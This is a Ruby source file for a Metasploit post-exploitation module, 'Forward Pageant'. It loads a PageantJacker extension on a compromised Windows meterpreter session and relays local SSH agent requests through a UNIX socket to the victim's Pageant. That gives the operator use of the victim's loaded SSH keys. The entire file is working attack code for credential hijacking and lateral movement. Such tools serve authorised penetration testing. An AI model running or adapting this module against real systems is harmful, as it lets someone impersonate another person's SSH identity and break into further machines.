##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'tmpdir'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Forward Pageant',
        'Description'   => %q{
            This module forwards Pageant.
          },
        'License'       => MSF_LICENSE,
        'Author'        => 'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
    register_options(
      [
        OptString.new('SOCKETPATH', [false, 'Specify a filename for the local UNIX socket.', nil]),
      ], self.class)
  end

  def run


    ## load incognito
    if(!session.pageantjacker)
      print_status("Loading PageantJacker extension on session #{session.sid} (#{session.session_host})")
      session.core.use("pageantjacker")
    end

    if(!session.pageantjacker)
      print_error("Failed to load PageantJacker on session #{session.sid} (#{session.session_host})")
      return false
    end

    if datastore['SocketPath']
        @sockpath = datastore['SocketPath'].to_s
    else
        @sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
    end

    if ::File.exists?(@sockpath)
        print_error("Your requested socket (#{@sockpath}) already exists. Remove it or choose another path and try again.")
        return false
    end 

    ::UNIXServer.open(@sockpath) {|serv|
      print_status("Launched listening socket on #{@sockpath}.")
      print_status("Set SSH_AUTH_SOCK variable to #{@sockpath} (e.g. export SSH_AUTH_SOCK=\"#{@sockpath}\")")
      print_status("Now use any tool normally (e.g. ssh-add)")

      print_status("Setting SSH_AUTH_SOCK to #{@sockpath}")
      ENV['SSH_AUTH_SOCK'] = @sockpath 
      loop { 
        s = serv.accept
        loop {
          socket_request_data = s.recvfrom(8192)
          break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
          response_data = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
          s.send response_data,0 if !response_data.nil?
        }   
      }   
    }   

  end

  def cleanup
    if @sockpath
        if ::File.exists?(@sockpath)
            ::File.delete(@sockpath)
        end
    end
  end

end
